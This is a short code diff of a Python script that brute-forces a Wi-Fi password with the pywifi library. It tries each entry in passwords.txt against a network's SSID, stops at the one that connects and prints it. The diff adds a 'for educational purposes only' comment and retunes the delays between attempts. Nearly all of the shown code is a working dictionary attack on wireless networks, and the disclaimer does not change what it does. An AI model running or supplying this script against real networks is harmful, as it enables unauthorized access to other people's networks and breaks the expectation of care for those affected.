@@ -1,3 +1,4 @@
+# FOR EDUCATIONAL PURPOSES ONLY
 
 import pywifi
 from pywifi import const
@@ -21,7 +22,7 @@ def test_password(ssid, password):
     tmp_profile = iface.add_network_profile(profile)
     
     iface.connect(tmp_profile)
-    time.sleep(0.4)
+    time.sleep(0.5)
     
     if iface.status() == const.IFACE_CONNECTED:
         return True
@@ -36,5 +37,5 @@ with open("passwords.txt", "r") as f:
         if test_password(ssid, pwd):
             print(f"correct password: {pwd}")
             break
-        time.sleep(0.3)
+        time.sleep(0.2)
 
